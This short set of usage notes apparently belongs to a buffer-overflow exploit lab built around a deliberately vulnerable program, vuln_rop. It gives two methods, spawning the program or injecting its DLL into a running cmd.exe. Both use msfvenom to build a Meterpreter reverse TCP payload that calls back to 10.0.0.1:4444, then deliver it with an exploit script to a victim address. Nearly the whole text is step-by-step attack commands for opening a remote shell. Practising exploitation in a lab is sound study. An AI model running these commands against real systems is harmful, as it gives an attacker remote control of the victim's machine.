## First method (spawn)

Run application with buffer overflow on the victim:

`vuln_rop.exe`

Prepare evil code:

`msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o meter.bin`

Inject evil code into the victim via buffer overflow:

`python2 expl_rop.py c VICTIM_IP 8888 meter.bin`

## Second method (attach)

Find 32-bit process on the victim:

`\windows\syswow64\cmd.exe`

`tasklist | findstr cmd.exe`

Inject buffer overflow into legimate process:

```dllinject PID_OF_CMD c:\full\path\to\vuln_rop.dll```

Prepare evil code:

`msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o meter.bin`

Inject evil code into the victim via buffer overflow:

`python2 expl_rop.py c VICTIM_IP 8888 meter.bin`
